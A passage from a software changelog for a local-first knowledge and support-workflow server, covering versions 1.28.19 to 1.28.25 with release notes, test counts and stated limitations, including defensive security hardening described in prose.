- **Improvements:** the shift ring — declare site on-call windows with declared overlap budgets and get, for any instant, which site owns the queue; the queue re-scopes to the incoming site during the overlap window while open cases keep their envelopes untouched.
- **Improvements:** deterministic read-time arithmetic over stored rows — no scheduler daemon, no background worker.
- **Security fixes:** none new; all surfaces are gated (Read / Admin), every mutation audited in-tx, reads bounded, inputs size-capped, and the double-booking validator refuses windows that don't respect the declared overlap budget.
### Engineering record
- Tests: server main bin **849** / 6 ignored (**+4**: the three plan-named pins `overlap_window_derives_from_shift_pair` / `shift_table_validates_no_double_booking` / `ring_boundary_rescopes_queue_not_cases` + storage round-trip), lib **194** / 1; clippy `-D warnings` + fmt clean; lipstyk diff-strict clean. Schema 1.28.23 → **1.28.25** (additive `shifts` table + index). Live smoke on a DB copy: mid-shift refusal 409, final-hour accept, queue re-scope across the boundary, bad-window 400 — all green; `brain doctor` integrity ok.

### Honest ceilings
- The ring view is advisory scheduling DATA — nothing yet *enforces* follow-the-sun routing (Relay .27 schedules handovers into the overlap windows; the enforcement wiring is its scope).
- `roster` holds principal ids = personal data; the DSAR erasure sweep does NOT cover the `shifts` table yet (no subject-erasure path for rosters — flag for Crew .26, which owns people-visibility).
- Shift rows have no retention/TTL; stale sites accumulate until an operator deletes them (no DELETE surface this release — SQL-only).
- Refused inserts write no Denied audit row (nothing commits); consistent with the KCS conflict path, but contention evidence is thinner than the CAS-denial precedent.
- The 500-shift read cap means a ring whose active shift falls outside the newest-500 window degrades to "no scope" rather than erroring — irrelevant at realistic roster sizes.
- `previous_shift` pairs by nearest earlier start regardless of adjacency; gapped rings produce no overlap window unless windows actually share time.

---



## [1.28.24] — 2026-08-24 — "Beacon": knowledge goes public, demand drops

The demand-reduction half of KCS: approved articles become a **publicly published KB** as a generated static artifact an operator hosts — brain-server stays loopback/local-first; publishing is a human decision with its own verb, and a mistake's blast radius is an artifact rebuild, never a live data path.

**M1 (`brain kb build`):** new CLI subcommand emits a deterministic static site from `kcs_state='published'` articles in a domain: per-slug article pages (title + the four KCS sections + updated date/revision/provenance/canonical), index, client-side-only JSON search index, sitemap.xml, robots.txt, 404 — CSP `default-src 'none'; style-src 'unsafe-inline'` at the artifact level, no JS beyond the static index reader, no external assets. **Every field passes the strict public seam (`kb::sanitize_public`: unconditional PII redact → invisible strip → markdown-ref strip — no principal argument, no operator bypass)**, pinned by `pii_never_reaches_public_html`. Superseded slugs emit redirect pages to their survivor by reusing the existing `supersedes` evidence chain (`superseded_slug_redirects_to_survivor`). Same DB state ⇒ byte-identical output (`kb_build_is_deterministic_byte_for_byte`); a content-addressed SHA-256 `kb_manifest.json` lets the operator verify what they host (`kb_manifest_digests_match_files`). New lib modules `kb.rs` + `pii_mask.rs` — the mask primitives moved verbatim from `gate.rs` so the read gate, the write screen, and the public seam share ONE definition (`redact_unconditional`). Signing stays the shipped convention: sign the artifact tarball with `scripts/release-sign.sh` (documented in the command output).

**M2 (the publish gate):** proposal kind `kcs_publish {knowledge_id, public_slug, action}` created via `POST /kcs/articles/{id}/publish` (Write proposes; the capability is enforced at APPROVAL where it belongs). Approval requires `approve` AND the NEW distinct `publish` capability — a reviewer who may approve internal drafts is not thereby allowed to push content public (`publish_requires_publish_capability_and_audits`; existing roles unchanged — operators grant `publish` through the roles table). In-tx CAS: approved→published + slug assigned (uniqueness via the v1.28.23 partial unique index → `409 public_slug_taken`) + freshness stamped COALESCE-style; audited `workflow/kcs/publish`. `action=retract` returns published→approved; the next build drops the page (`retract_returns_to_approved_and_next_build_drops_page`). `GET /kcs/articles/{id}/preview` renders the EXACT public page through the same function the build uses under the same strict seam — what you approve is byte-identical to what ships (`gui_publish_node_previews_sanitized_public_page`).

**M3 (feedback flywheel):** `POST /webhooks/kb-feedback` is ALWAYS Standard-Webhooks HMAC-verified (secret via 0600-checked `BRAIN_KB_FEEDBACK_SECRET_FILE`, fail-closed; replay-window + seen-claim dedup) and converts each verified delivery into ONE anonymous `kb_feedback` finding row — `{slug, helpful, day_bucket, anonymous_id}` validated, no raw IP anywhere by construction (`kb_feedback_webhook_requires_hmac_and_rejects_replay`, `feedback_rows_store_no_raw_ip`). Scoreboard grows `self_service_deflection_units` + `kb_feedback_total` + `kb_hot_topics` (published slugs whose feedback repeats ≥ `KB_HOT_TOPIC_THRESHOLD`=3 — "article stale/missing" made visible; `deflection_and_hot_topic_roll_up_to_scoreboard`). Alerts ride existing kinds: a freshness watcher fires `expiry` once per past-due published article, and crossing the hot-topic threshold fires `workflow`.

**M4 (metrics honesty):** `docs/kb-deflection.md` — on-page deflection is INDICATIVE, repeat-contact rate (CRM/Bridges) stays the primary demand metric; both land on the weekly report + monthly human sign-off; no industry-lift claims anywhere.

### Release notes

- **Improvements:** `brain kb build --domain <d> --out <dir>` turns solved-case knowledge into a hostable static KB — deterministic bytes, SHA-256 manifest, superseded-slug redirects.
- **Improvements:** two-gate publishing (approve → publish) with preview: reviewers see exactly the sanitized page that will ship; retract-and-rebuild is the documented operational rollback.
- **Improvements:** the scoreboard gains self-service-deflection and hot-topic signals from an anonymous, PII-free on-page feedback webhook; stale-published-article alerts fire on the existing expiry kind.
- **Security fixes:** none new (all surfaces are role/HMAC-gated and fail closed); the strict public sanitize seam is stricter than the internal read gate by design.
### Engineering record
- Tests: server main bin **845** / 6 ignored (**+7**: five plan-named pins + slug-vocabulary + artifact-write pins in `kb`/`pii_mask`), lib **201** / 1 (**+10**: 8 kb + 2 pii_mask), brain CLI, mcp, bench unchanged counts pending CI; clippy `-D warnings` + fmt clean. No schema change (schema stays 1.28.23 — publish rides the pre-scaffolded columns).

### Honest ceilings
- The public site has no JS framework/analytics by design; search is one static JSON index read client-side.
- Artifact signing delegates to the operator (`scripts/release-sign.sh` over the tarball) — no minisign integration inside `brain kb build`.
- `revision` renders the article `content_hash`, not a CRM envelope law-version stamp (the envelope isn't persisted per-article).
- Deflection is vote-based and indicative; hot topics count feedback volume only, not CRM repeater clustering (that join lands when Bridges exports per-contact linkage).
- Public CDN caches after retract are the operator's concern (documented).
- The client console does not yet render a dedicated publish node; the preview endpoint is the render contract a Cockpit node consumes (server-side pin ships here).



## [1.28.23] — 2026-08-24 — "Evolve": the KCS loop closes — every solved case becomes knowledge, every case is linked to living knowledge

The KCS v6 double loop, wired to the substrate that already implements most of it. Solve-loop capture/structure/reuse/improve happen in the workflow; Evolve-loop content health and performance assessment land on the scoreboard. Closing a case without an article becomes *visible*, never silent.

**M1 (schema → 1.28.23, one-way additive):** `knowledge` grows `kcs_state` (`none | draft | approved | published`; existing rows stay `none` — KCS applies going forward), `public_slug` (unique WHEN published via a partial index; publishing itself is Beacon's, later), and `freshness_review_due`. New `case_articles(case_ref, knowledge_id, sir, action, ts)` — the solve-loop linkage; `searched_not_found` rows carry NULL `knowledge_id`, so the `(case_ref, knowledge_id, sir)` uniqueness is partial.

**M2 (Solve loop):** the reuse search records SIR rows — `searched_found` for hits the engine cites back via `GET /workflow/runs/{id}/suggestions?used=<ids>`, `searched_not_found` when the zero-hit abstention fires. A completed run that contradicted what it used (diverged steps or skipped verification) emits a `kcs_flag` finding per cited article — content-health input, never an edit (edits stay HITL). On the first `crm/case/closed` event the deterministic capture generator runs exactly once (outbox marker `kcs-capture-{case_ref}`): inputs are the run's recorded steps/findings/SIR rows, output ONE structured HITL proposal — `kcs_new_article` (body assembled from Issue/Environment/Cause/Resolution/Evidence, zero-token), `kcs_update_article` (the improve signal outranks similarity: a diverged reuse means the article needs fixing), or `kcs_link_only`. Approving promotes to a knowledge row born `kcs_state='draft'` (or writes only the linkage for link-only); a closed case with zero linkage emits a `kcs_unlinked_case` finding — operations see the gap, the machine never vetoes closure.

**M3 (lifecycle):** `POST /kcs/articles/{id}/approve` (Write on the domain + `approve` role) moves draft → approved and stamps the 90-day freshness deadline; `GET /kcs/articles?state=&stale=1` is the content-health worklist (past-deadline articles + open improve flags). Superseding an article now follows the linkage: its `case_articles` rows point at the survivor in the same tx.

**M4 (performance assessment):** the scoreboard carries `kcs_linkage_rate_units`, `searched_found_rate_units`, and `article_freshness_median_age_secs` (`repeat_contact_rate_units` was already aggregated). The weekly calibration report rides the same numbers; the monthly human sign-off covers them unchanged.

### Release notes

- **Improvements:** solved support cases can now become searchable knowledge — the capture generator drafts a structured article proposal (Issue / Environment / Cause / Resolution / Evidence) from the case's own recorded evidence; a human approves it through the existing review queue.
- **Improvements:** new content-health worklist (`GET /kcs/articles?stale=1`) surfaces articles needing review — stale freshness deadlines plus flags from runs whose evidence contradicted them.
- **Improvements:** the scoreboard gains three KCS measures (linkage rate, reuse rate, freshness median age); the weekly report carries them.
- **Security fixes:** none (no auth/gate changes; both new routes are role-gated and audited).
### Security fixes (deep hardening pass over v1.28.15–v1.28.22)
- **HIGH — mediated exec no longer leaks the server's environment.** Engine-spawned
  processes now run with a minimal env (`env_clear` + PATH/HOME/TMPDIR); the
  audit-chain key, bearer tokens, and JWT material can never be exfiltrated by an
  allowlisted program that prints its environment
  (`exec_child_gets_minimal_environment_not_the_servers`).
- **MCP streamable-HTTP transport hardened from all angles:** non-loopback binds
  without `MCP_HTTP_TOKEN` now REFUSE to boot (fail-closed — the unauthenticated
  LAN tool surface is gone); per-peer rate limiting (240 req/min, bounded key map,
  poison-tolerant lock) sits BEFORE token work; browser-attested `Origin` headers
  must be loopback (DNS-rebinding posture, IPv6-literal safe); request bodies are
  capped DURING the read (`DefaultBodyLimit` + `to_bytes` bound → 413), never
  buffered-then-checked; GET/DELETE probes get 401 for unauthenticated callers
  (no configuration-distinguishing surface); bearer comparison is constant-time;
  upstream error bodies are logged to stderr and genericized before reaching any
  LLM context.
- **MCP stdio: the line cap finally caps.** The old `read_line` guard fired only
  after buffering the whole line; reads are now chunked and stop at
  `MAX_LINE_BYTES` — a multi-GB newline-free stream produces bounded `-32700`
  refusals, not an OOM.
- **Rewind role gate judges the right store:** the `approve` capability is now
  checked against the RUN'S DOMAIN pool, not the global one; CAS conflicts
  surface as `409 cas_stale` instead of a 500.
- **Handoff packet read-seam parity:** `intent`, `is_seed`, `is_not_seed`, and
  `pending_question` pass `sanitize_read` like every other emitted stored-text
  field (user input lands in run state legitimately via steering/rewind/CRM).
- **SSE replay amplification bounded:** Last-Event-ID backfill is capped globally
  (1,000 events across all domains); the workflow-payload shared-broadcast
  posture (sanitize-once, machine-data, PII enforced at write time) is documented
  where it lives.
- **CRM connector lows closed:** Genesys pagination is page-capped (50/run,
  resumes next tick) so a hostile endpoint cannot spin the connector; vendor
  contact ids are percent-encoded before URL-path use; Salesforce SOQL interpolates
  only persisted modstamps that pass a strict ISO-8601 shape check.

### Engineering record

- Tests: server main bin **838** / 6 ignored (**+25**: the eight plan-named pins — two in the SDK pure core, six server-side — plus guard/coverage updates), lib **182** / 1 (unchanged), brain 19, mcp **32** (+2), eval 4, metrics 8; sdk **108** / 0 (**+3**); steward-harness **17** / 0 (unchanged); client **228** / 0 (unchanged count; +1 Evolve render pin inside existing suites). clippy `-D warnings` + fmt clean on ALL FOUR workspace nodes; otel gate 1110 passed; UMP conformance L3 green; recall floor r@5 0.976 / r@10 0.991 / mrr 0.956 (CI recipe, scratch instance).- Named pins: `closed_case_generates_kcs_proposal_with_four_sections`,
  `gap_rule_selects_new_update_or_link_only`,
  `human_approval_moves_draft_state_and_sets_freshness`,
  `unlinked_closed_case_is_flagged_not_blocked`,
  `sir_rows_record_found_and_not_found`,
  `improve_flag_emitted_on_cited_article_contradiction`,
  `superseded_article_linkage_follows_survivor`,
  `scoreboard_carries_kcs_fields_and_calibration_signs_them`.
- New modules: `crates/brain-engine-sdk/src/pure/kcs.rs` (pure decision core),
  `src/workflow/kcs.rs` (substrate writes), `src/handlers/kcs.rs` (routes).
- openapi.yaml + route-coverage + route-authz guard tables + docs/api.md updated
  in the same change.
- Honest ceilings: per-hit citation tracking depends on engines sending
  `used=<ids>` (absent = no found-SIR rows recorded, not_found still lands);
  capture runs on the first `crm/case/closed` event delivery, not on engine-run
  Done directly (a closed case without a CRM binding captures nothing);
  pre-Evolve knowledge rows keep `kcs_state='none'` (no backfill); publishing
  is out (Beacon's); freshness horizon is a constant 90 days (per-domain policy
  lookup later); proposals carry fixed novelty/salience placeholders (the
  scorer's inputs do not apply to structured bodies); the KCS measures read the
  global register only (multi-domain aggregation later).

---



## [1.28.22] — 2026-08-24 — "Bridges": the universal loop's intake — support cases flow in from the CRMs

One normalized case shape ([`CrmCase`], `src/connector/crm/`), three vendor connectors (Zendesk cursor incremental export, Salesforce client-credentials OAuth + SOQL by `SystemModstamp`, Genesys Cloud workitems + externalcontacts), and one delivery path: case **bodies** enter through the UMP `/ingest` single-record route — under `BRAIN_WRITE_POSTURE=review` they land as pending proposals, never memory (the HITL gate applies to CRM content exactly as to web content); case **envelopes** open governed runs (`POST /workflow/runs`, kind `support-case`, state carries the stable `case_ref`) and post `crm/case/updated` / `crm/case/closed` outbox events — closed-solved is the Evolve capture trigger (v1.28.23). The `crm_cases` linkage table (schema → **1.28.22**, additive) binds each `case_ref` to its run idempotently — the invariant Evolve depends on.

**Security posture** (mirrors the GitHub connector): all URLs built from config-derived hosts only, enforced by a transport-level host allowlist (`no_crm_url_from_memory_content`); Salesforce `nextRecordsUrl` reduced to an instance-relative path (a forged next-page cannot move the bearer); redirects refused; 5s/15s bounded timeouts; response bodies capped BEFORE buffering; secrets in 0600 files via the shared mode-check, fail-closed (`connector_secrets_refuse_wide_modes`); customer identity stored only as salted SHA-256 `subject_ref`; token refresh fail-closed (`salesforce_modstamp_sync_refreshes_token_fail_closed`). Vendor sync loops are pure functions over a `VendorTransport` trait — mock-transport tested with zero network in the DEFAULT build; only the reqwest adapter (`connector/crm/http.rs`) and `brain-connector-crm` are feature-gated (`connector-crm`). Operator-cranked via cron (300s cadence floor, `zendesk_cursor_sync_is_idempotent_and_respects_cadence`); the supervisor stays unwired. Structured symptom fields ride as `is_seed`/`is_not_seed` straight into the frontdoor Handoff contract. Custom CRMs (Freshdesk/ServiceNow/JSM): docs + pure-mapping recipe only — deliberately NO generic JSONPath runtime (`docs/connector-crm-custom.md`). No new server routes, no openapi change, zero new dependencies.

### Release notes

- **New: support cases flow in from your CRM.** One binary (`brain-connector-crm`)
  pulls Zendesk tickets, Salesforce Cases, and Genesys Cloud workitems into the
  universal loop — each case opens one governed run and every update lands as a
  `crm/case/updated` or `crm/case/closed` event.
- **Human review by default:** under `BRAIN_WRITE_POSTURE=review`, case content
  enters as proposals for operator approval — it never writes memory directly.
- **Privacy unchanged:** customer identities are stored only as salted SHA-256
  subject refs; no CRM writeback; no background syncing (cron-cranked).
- **Custom CRMs** (Freshdesk, ServiceNow, JSM): configuration recipe in
  `docs/connector-crm-custom.md`.
### Engineering record
- Tests: named pins shipped — `zendesk_cursor_sync_is_idempotent_and_respects_cadence`,
  `salesforce_modstamp_sync_refreshes_token_fail_closed`,
  `genesys_workitem_maps_to_case_with_external_contact`,
  `case_body_routes_to_proposal_under_review_posture` (integration),
  `closed_solved_event_opens_capture`, `crm_cases_upsert_is_idempotent_by_case_ref`,
  `connector_secrets_refuse_wide_modes`, `no_crm_url_from_memory_content`.
- Server main bin **830** / 6 ignored (**+17**), lib **182** / 1 (**+16**), mcp 19,
  brain 18→19, bench 8, eval 4, metrics 8; client **228** / 0; clippy `-D warnings`
  + fmt clean on server (default/bench/connector-crm) + sdk + client; live smoke on
  a COPY of the real DB green (`VACUUM INTO` copy → migration stamped 1.28.22 →
  `brain doctor` ✓ @ 1.28.22 → `/audit/verify ok:true` → support-case run opened +
  `crm/case/closed` event accepted end-to-end on the wire).

### Honest ceilings
- Delivery rides the UMP `/ingest` path rather than `/ingest/markdown`: the plan
  assumed markdown ingest honors the review posture — it does not (vault semantics),
  and adding the gate there would change existing behavior outside this release's
  scope. The UMP single-record path already proposes under review posture, so the
  guarantee holds where it matters.
- Genesys sync walks workitems per invocation without persisting a resume cursor
  (delivery is idempotent, so re-walks dedupe server-side); Zendesk persists its
  opaque `after_cursor`, Salesforce its newest `SystemModstamp`.
- No CRM writeback (posting resolutions back is later + separately gated); no
  background supervisor sync (cron only); custom-CRM support is docs + pure
  mappers, not a runtime field-mapping engine; PII stays behind hashed subject refs.
- Client/sdk/harness version stamps aligned at 1.28.22 for consistency; none of
  their code changed (one pre-existing client clippy lint folded in).

---



## [1.28.21] — 2026-08-24 — "Fathom": virtual unlimited context — unbounded session, deterministic windowing

A case lives in ONE run from intake to close — no new sessions, ever — and every consumer derives the smallest high-signal window from it on demand. Checkpoints move to a deterministic cadence (replayable windows), a pure context-window derivation ships in the SDK behind one Read-gated route, the transcript scrolls forever via keyset windowing (no virtual-scroll dependency), and the event stream resumes after a disconnect with `Last-Event-ID` + `?since=` backfill. Server + client + sdk + harness versions align at **1.28.21**; schema unchanged; zero new dependencies.

### Release notes

- **Improvements:** The derived context window: `GET /workflow/runs/{id}/context?at_event=&budget=` returns latest checkpoint at-or-before the anchor + delta events after it + per-finding digests + the open question. Field-budgeted (`budget`, default 2000, cap 100000) with truncation dropping OLDEST-delta-first and never dropping the checkpoint or question, flagged `truncated`. Prefix-stable by construction: appending events never changes an earlier window (pinned). One counted field ≈ one token — documented approximation, not guessed.
- **Improvements:** Deterministic checkpoint cadence in the engine: `workflow/checkpoint` fires on every AskHuman pause, every phase transition (`Advance`), every N events (`BRAIN_CHECKPOINT_EVERY`, default 25, ceiling 100 — resolver clamps both degenerates), and once during finalize so a completed run ends ON a checkpoint. Replaces the old every-step emission; idempotency keys derive from persisted facts so replays stay exactly-once.
- **Improvements:** The transcript scrolls forever: the run panel renders a bounded keyset slice of the assembler's ordered nodes (live tail + pulled-up earlier ranges, pure `Vec` slicing — no new dependency); "Load earlier" extends the window; a ten-thousand-node run never renders ten thousand nodes.
- **Improvements:** Session-age badge on the composer (`N events · M checkpoints · oldest #id`) instead of any "new session" affordance — there is none anywhere in the GUI, and a source-scan test keeps it that way.
- **Improvements:** Stream resume: SSE consumers send `Last-Event-ID` (the workflow outbox id) on reconnect; the server replays stored rows past it (bounded to one drain batch per pass, same envelope shape, same read seam, fail-closed per-domain Read gate) before going live; `GET /workflow/runs/{id}/events?since=` backfills older gaps; client dedup admits the gap and drops replays (pinned).
- **Improvements:** Continuity contract documented for consumers ([docs/memory-lifecycle.md](docs/memory-lifecycle.md) §The continuity contract + plugin README): sessions are unbounded; LLM-side compaction is the CONSUMER's contract using the derivation API — brain-server never summarizes (zero-token rule); rewind replaces rotation.
- **Improvements:** wasm-split enabled (operator-requested deviation from the plan's non-goals): `dx build --platform web --release --wasm-split` is green. `.cargo/config.toml` swaps `-C strip=symbols` → `strip=debuginfo` + `-C link-arg=--emit-relocs` (the splitter needs relocations + function names; DWARF-only stripping); `bundle-budget.sh` measures the SHIPPED posture (custom sections stripped via a pure section-frame walk) since the raw artifact legitimately carries splitter metadata. No `#[wasm_split]` boundaries annotated yet — see ceilings.
- **Security fixes:** None (additive release; all gates reused — the context route is Read-gated on the run's domain with row-domain re-auth, and every emitted payload rides the existing `sanitize_read` seam).
### Engineering record

- **M1 (cadence):** `resolve_checkpoint_every(Option<u32>)` (default 25, clamp 1..=100) beside `resolve_budget`; the crank tracks `events_since_ckpt` and fires through ONE checkpoint seam (bounded by the existing ≤256 KiB guard — oversized states still error loudly, never truncate). Keys: `run-{id}-ckpt-ask-{ordinal}` / `-adv-{rev}` / `-n-{ordinal}` / `-ckpt-end` — persisted facts only, so crash-replay dedups. Pinned by `checkpoints_fire_on_askhuman_phase_and_event_count` + `checkpoint_cadence_is_env_tunable_with_ceiling`; predecessor pins (`checkpoint_payload_round_trips_state_exactly`, rewind branch/replay-idempotence) pass UNCHANGED.
- **M2 (derivation):** SDK `workflow_state::derive_context_at(events, at_event, budget)` + convenience `derive_context` — pure, clock-free, panic-free on malformed payloads (degrades to empty notes); findings digests are FNV-1a 64 (stable, dependency-free, explicitly NOT a security primitive); field counting = scalar 1 / array Σ / object 1+Σ. Route in `handlers/workflow_lineage.rs`: derivation runs on RAW payloads (it needs parseable JSON), sanitization applies to every EMITTED field — the read seam covers output, not input. Wired into router + route-coverage + route-authz guard tables + openapi.yaml (full response schema) + docs/api.md. Pinned by four SDK tests (`window_is_latest_checkpoint_plus_delta_plus_notes`, `truncation_drops_oldest_delta_first_and_flags`, `appending_events_never_changes_earlier_windows`, `window_at_askhuman_includes_open_question`) + the integration pin `context_route_derives_checkpoint_delta_and_budget`.
- **M3 (scrollback + resume):** `transcript_window(total, earlier, size)` + `session_age(lineage)` are pure panel fns pinned without a runtime (`transcript_windows_over_ten_thousand_nodes_without_rendering_all`, `session_age_badge_reads_lineage_counts`, `sse_resume_backfills_gap_without_duplicates`, `no_rotation_affordance_in_panel` — literals split so the guard cannot match itself, the v1.27.21 lesson). `stream_events` gains the `Last-Event-ID` header; the app-level stream driver threads the max workflow event id across reconnects. Server replay lives in `alert.rs::workflow_replay_since`. i18n keys land in ALL FIVE locales (parity wall intact).
- **Deviation note:** the plan cites "SDK events::PHASE"; no such constant exists — the phase-transition trigger is `Decision::Advance` (the whole-state-replacement boundary), the closest real seam. Documented rather than invented.
- Tests: server main bin **813** / 6 ignored (**+1**), lib **166** / 1, brain 19, mcp 30, eval 4, metrics 8; sdk **105** / 0 (**+4**); steward-harness **17** / 0 (**+2**, settle call-site updated for the cadence arg); client **228** / 0 (**+4**); clippy `-D warnings` + fmt clean on ALL FOUR workspace nodes; live smoke on a COPY of the real DB green (`/health ok` @ 1.28.21, `/audit/verify ok:true`, context route default/budgeted/anchored, `?since=` backfill, SSE Last-Event-ID replay observed on the wire).

### Honest ceilings

- **No `#[wasm_split]` boundaries yet** — the splitter runs green but emits only an empty chunk_0; annotating lazy panel boundaries waits until a real second module earns its fetch. The shipped dx artifact measured **3.05 MB** (wasm-opt'ed); the budget gate reads the stripped-posture raw build at **4.11 MB** vs the unchanged 5.5 MiB cap.
- Field budget ≈ tokens is an approximation by design; consumers wanting token-exact budgets must count on their side.
- Findings digests name findings; they do not authenticate them (FNV-1a, non-cryptographic — the audit chain remains the integrity surface).
- SSE resume covers the WORKFLOW coordinate space only (the alert feed's own re-sync remains the poll fallback + lineage read); replay is bounded to one drain batch per domain per request — older gaps go through `/events?since=`.
- Compaction/summarization is NOT built here (zero-token rule); the openclaw consumer owns its prompt slice construction.
- The engine-pull worker remains unwired (v1.28.20 ceiling carried): the GUI crank button still says so honestly.

---



## [1.28.20] — 2026-08-23 — "Cockpit": the console surface is real, one codebase, every platform

The client stops being web-only-in-truth: desktop and mobile become cargo features of the same codebase (`default = ["web"]` — every existing gate untouched), the run transcript's three unrendered node kinds (assistant / tool / delivery) get real renderers, evidence becomes a first-class view, the lineage timeline becomes a component with its own deep-linkable route, and `GET /workflow/scoreboard` gets a panel. Server code unchanged; server + client versions align at **1.28.20** (client 1.28.19 → **1.28.20**); schema unchanged.

### Release notes

- **Improvements:** Desktop is a build target: `cargo check/build --features desktop` compiles a native window shell from the same tree; `scripts/build-desktop.sh [macos|nsis|appimage|all]` wraps the documented `dx bundle --desktop` command set with fail-on-error discipline (the dx CLI stays an operator install — that line was already honest, it stays honest). The `mobile` feature is a compile-smoke target in CI, explicitly allow-fail this release — no store submission has shipped, STORE_READINESS untouched.
- **Improvements:** Downloads work off the browser now: audit exports, UMP/DSAR exports, and recall-trace exports all go through ONE download seam — blob save on web, native file write to `BRAIN_DOWNLOAD_DIR` on desktop/mobile, behind one traversal-safe filename gate.
- **Improvements:** The transcript renders all five node kinds: assistant turns stream progressively and settle, tool invocations render name/status cards, delivery packets render their collected items with a done badge. Unknown kinds still fall through to the generic card — nothing is silently dropped.
- **Improvements:** Evidence as a view: a settled tool node whose output carries structured evidence renders findings with provenance origins, contradictions as LINKED PAIRS (both rows together or not at all — a one-sided half is refused), evidence digests, and verification questions with justification + score. Read-only over machine-written state; absent fields render absent, never invented.
- **Improvements:** New `/runs/:id/timeline` route renders the full lineage (branch markers, checkpoint badges, AskHuman pauses) through the SAME TimelineView component the workflow-run node uses; linked from the transcript header.
- **Improvements:** New `/scoreboard` panel (nav-gated with Audit): nine metric cards + runs-scored + audit-green badge + the weekly calibration-report badge, rendered only from fields the endpoint actually shipped.
- **Improvements:** Composer `/commands`: `/crank [steps]`, `/handoff`, `/scoreboard`, `/help` — the CLI verbs, GUI-ified. `?` opens a keyboard/command cheat-sheet dialog (Esc closes). J/K/A/R conventions unchanged.
- **Improvements:** The human crank control ships bounded (1–500 steps selector) and role-gated (Write+Approve) — but is honestly unwired: there is NO HTTP crank route (crank today spawns the local steward-harness binary, which a browser cannot do). Pressing it says so instead of pretending. The engine-pull worker milestone makes it real next.
- **Security fixes:** The download filename gate refuses any `..` path component BEFORE separator flattening, plus separators/control characters — a download can never escape its target directory (the session-learning traversal rule, applied where new file-write code landed).
### Engineering record

- **M1 (platforms):** `client/Cargo.toml` gains the Dioxus feature triad (`web`/`desktop`/`mobile`, default `web`); `[desktop.window]` lands in Dioxus.toml; CI's client-gate adds `libwebkit2gtk` headers + `cargo check --features desktop --all-targets` (compile correctness, no GUI run) and an honestly-labeled allow-fail mobile smoke row. The three blob-download sites collapse onto the shared `src/download.rs` seam (native path writes to `BRAIN_DOWNLOAD_DIR`, XDG-Downloads fallback, no new dependency).
- **M2/M3 (surface):** view-model builders ship on the node definitions themselves (`AssistantTurn`/`ToolInvocation`/`Delivery::build_view_node`) so the panel renders models, not raw folds. `FrameGate` — the AnimationFrame coalescing policy core — ships pinned; see ceilings for why it is not yet the runtime driver. Evidence extraction (`evidence_of`, `contradiction_pair`) and timeline classification (`timeline_marker` → Checkpoint/Branch/AskHuman/Plain) are pure fns pinned without fetches.
- **M4 (honesty):** ~40 new i18n keys land in ALL FIVE locales (translated, en fallback intact) under the existing parity wall. The wasm graph gate (`bundle-budget.sh`) fails CI if the normal-edge tokio graph grows runtime features beyond `sync`. Size posture: `.cargo/config.toml` applies `-C opt-level=z -C strip=symbols` to the wasm target (mirroring the new `[web.wasm_opt] level = "z"` for dx bundles).
- **Budget ledger note:** the wasm budget gate was ALREADY RED at v1.28.19 as measured locally (5.96 MB raw release build vs the 5.5 MiB cap — the cap was set against a wasm-opt'ed artifact while CI builds raw). This release's `opt-level=z` rustflags bring the raw CI measurement to **4.09 MB**, green with real headroom; the cap itself is unchanged (5,734,400 bytes).
- Tests: server main bin **812** / 6 ignored (unchanged), lib **166** / 1 (unchanged), brain 19, mcp 30, eval 4, metrics 8 (unchanged); client **224** / 0 (**+12**: frame coalescing, five-kind view models, composer command parsing incl. crank bounds, keyboard help, crank role/bound pins, evidence extraction + linked-pair refusal, scoreboard wire-shape match, download traversal gate, timeline markers). clippy `-D warnings` + fmt clean on both trees AND `--features desktop`; live smoke on a COPY of the real DB green (boots, `/health ok`, `/audit/verify ok:true`).

### Honest ceilings

- **The crank button does not crank.** No HTTP crank route exists; the GUI control is bounded, role-gated, and truthful about being unwired until the engine-pull worker milestone (persistent harness worker claiming steps via CAS — decided during this session as the next release).
- **AnimationFrame coalescing rides the scheduler, not a clock.** The panel refolds once per committed render batch (Dioxus effects), which is one flush per paint in practice; the pinned `FrameGate` policy core becomes the literal runtime driver when a requestAnimationFrame bridge seam exists (needs a timer primitive on web without a new dependency).
- Mobile remains a compile-smoke target (allow-fail in CI this release); desktop bundles are operator-built via dx — CI checks compilation, never bundles.
- The cheat-sheet drawer has `role="dialog"`/`aria-modal`/Esc-close; the full Tab-cycle focus trap + focus restoration remain the documented drawer ceiling.
- Scoreboard renders only shipped endpoint fields; a new scorer field that doesn't land in `METRIC_FIELDS` silently doesn't render (by design — nothing invented client-side).

---



## [1.28.19] — 2026-08-23 — "Witness": the client finally testifies

The client-side evidence loop closes: a workflow-outbox drain worker publishes drained `workflow/*` events on the `/events` SSE bus (opt-in, domain-gated, sanitized before broadcast), the GUI holds a persistent reconnecting stream instead of a chunk-and-drop poll, posts per-plugin mount evidence with the Anchor-signed boot-manifest digest, and the review-job / workflow-run chat nodes become real HITL surfaces on a new `/runs/:id` conversation panel. Plus: the standalone `mcp` binary gains the MCP Streamable HTTP/SSE transport alongside stdio. Server `Cargo.toml`/lock 1.28.18 → **1.28.19**; client 1.28.14 → **1.28.19**; schema unchanged (1.28.18 — zero DDL); SDK + harness unchanged.

### Release notes

- **Improvements:** `/events` now also carries drained `workflow/*` outbox events under kind `workflow` with payload `{topic, run_id, payload_json, event_id, parent_event_id, domain}`. Additive and default-off: existing consumers see nothing unless they explicitly ask `?kinds=workflow`, and even then only events whose run domain they may Read (checked per subscriber at fan-out; denied events are dropped, never leaked).
- **Improvements:** The GUI holds ONE persistent `/events` stream for the whole app (survives route changes): capped exponential backoff (1 s → 30 s), deduped per coordinate space (alert `seq`, outbox `(run_id, event_id)`), bounded 500-event ring. The old 10 s poll is demoted, not removed — it wakes only after two consecutive stream failures.
- **Improvements:** New `/runs/:run_id` conversation panel (deep-linkable): the run's stream events fold through the conversation assembler into keyed chat nodes — `review-job` renders digest + SLA clock + role gate with inline approve/reject (the ApprovalDock's digest-bound decision action moved to where the evidence streams in; the dock itself remains on Overview), and `workflow-run` renders the lineage timeline (parent links + branch markers) and the live AskHuman card. Unknown node kinds fall back to a generic card — never silently dropped. Keyboard conventions reused from Review (A/R decide, J/K walk).
- **Improvements:** Mount evidence flows at last: every GUI boot posts one `POST /workflow/plugins/mount` per mounted plugin, carrying the bundle SHA-256 read from the Anchor-signed `/app/boot.json` (`.wasm` entry preferred). Fire-and-forget with a console warning — evidence loss is visible, never fatal.
- **MCP over HTTP:** the `mcp` binary now serves its full JSON-RPC surface over Streamable HTTP (`POST /mcp`, SSE-framed when the client's `Accept` asks) in addition to stdio — opt-in via `MCP_TRANSPORT=http` / `MCP_HTTP_ADDR`. Example Claude Desktop and OpenClaw configurations are in docs/mcp.md.
